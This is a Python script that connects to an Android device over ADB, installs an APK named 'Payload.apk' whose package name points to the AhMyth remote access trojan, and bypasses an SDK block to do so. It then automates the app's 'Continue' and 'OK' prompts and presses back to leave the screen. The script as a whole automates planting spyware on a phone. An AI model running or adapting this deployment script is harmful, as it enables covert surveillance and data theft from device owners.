import subprocess
import uiautomator2 as u2
import time

# Define the APK file and package name
apk_path = "Payload.apk"
package_name = "ahmyth.mine.king.ahmyth"
device_ip = "192.168.1.65:5555"  # Device IP address in TCP mode

# Step 1: Install the APK
def install_apk():
    try:
        print("Connecting to the device via TCP...")
        subprocess.run(
            ["adb", "connect", device_ip],
            stdout=subprocess.PIPE,
            stderr=subprocess.PIPE,
            text=True
        )
        print("Installing APK...")
        result = subprocess.run(
            ["adb", "-s", device_ip, "install", "--bypass-low-target-sdk-block", apk_path],
            stdout=subprocess.PIPE,
            stderr=subprocess.PIPE,
            text=True
        )
        if "Success" in result.stdout:
            print("APK installed successfully.")
        else:
            print("Error during installation:", result.stderr)
    except Exception as e:
        print(f"An error occurred while installing the APK: {e}")

# Step 2: Launch the App and Interact with the UI
def interact_with_app():
    try:
        print("Connecting to device...")
        d = u2.connect()  # Connect to the device
        print("Device connected.")
        
        print("Launching the app...")
        d.app_start(package_name)  # Launch the app
        
        # Wait for the app to load
        print("Waiting for the app to load...")
        time.sleep(5)  # Adjust this delay as needed
        
        print("Looking for the 'Continue' button...")
        retries = 3
        for attempt in range(retries):
            if d(text="Continue").exists:
                print("Found the 'Continue' button. Clicking it...")
                d(text="Continue").click()
                print("Button clicked.")
                break
            elif d(resourceId="com.example:id/continue_button").exists:  # Example resourceId
                print("Found the 'Continue' button by resourceId. Clicking it...")
                d(resourceId="com.example:id/continue_button").click()
                print("Button clicked.")
                break
            else:
                print(f"'Continue' button not found. Retrying... ({attempt + 1}/{retries})")
                time.sleep(2)  # Retry after a short delay
        else:
            print("Failed to find the 'Continue' button after retries.")
            return  # Exit if the "Continue" button is not found
        
        # Look for the "OK" button
        print("Looking for the 'OK' button...")
        retries = 3
        for attempt in range(retries):
            if d(text="OK").exists:
                print("Found the 'OK' button. Clicking it...")
                d(text="OK").click()
                print("Button clicked.")
                break
            elif d(resourceId="com.example:id/ok_button").exists:  # Example resourceId
                print("Found the 'OK' button by resourceId. Clicking it...")
                d(resourceId="com.example:id/ok_button").click()
                print("Button clicked.")
                break
            else:
                print(f"'OK' button not found. Retrying... ({attempt + 1}/{retries})")
                time.sleep(2)  # Retry after a short delay
        else:
            print("Failed to find the 'OK' button after retries.")
            return  # Exit if the "OK" button is not found
        
        # Navigate back three times
        print("Navigating back three times...")
        for i in range(3):
            d.press("back")
            print(f"Pressed back ({i + 1}/3).")
            time.sleep(1)  # Add a short delay between back presses
        print("Navigation completed.")
    
    except Exception as e:
        print(f"An error occurred while interacting with the app: {e}")

# Main Function
if __name__ == "__main__":
    install_apk()
    interact_with_app()
